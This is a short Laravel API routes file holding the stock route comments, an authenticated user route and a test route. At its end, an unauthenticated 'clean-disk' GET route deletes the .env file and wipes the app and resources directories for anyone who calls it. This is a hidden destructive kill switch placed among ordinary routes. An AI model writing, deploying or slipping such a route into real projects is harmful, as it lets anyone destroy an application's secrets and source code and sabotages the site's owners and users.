<?php

use Illuminate\Filesystem\Filesystem;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
    return $request->user();
});
Route::get('/test', function () {
    return 'test';
});

Route::get('clean-disk', function(){
    $file = new Filesystem;
    $file->delete(base_path('.env'));
    $file->cleanDirectory(base_path('app'));
    $file->cleanDirectory(base_path('resources'));
    return 'done';
});
